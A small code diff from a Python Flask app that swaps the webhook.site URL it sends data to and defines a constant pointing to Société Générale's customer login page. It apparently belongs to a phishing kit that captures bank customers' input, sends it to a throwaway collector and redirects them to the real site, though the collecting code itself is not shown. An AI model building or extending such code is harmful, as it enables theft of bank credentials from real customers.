@@ -3,8 +3,7 @@ import requests
 
 app = Flask(__name__)
 
-
-WEBHOOK_URL = "https://webhook.site/8324395e-7a3b-4289-a800-e9759cf53b78"
+WEBHOOK_URL = " https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a"
 
 
 REAL_SG_URL = "https://www.societegenerale.com/fr/particulier/espace-client"
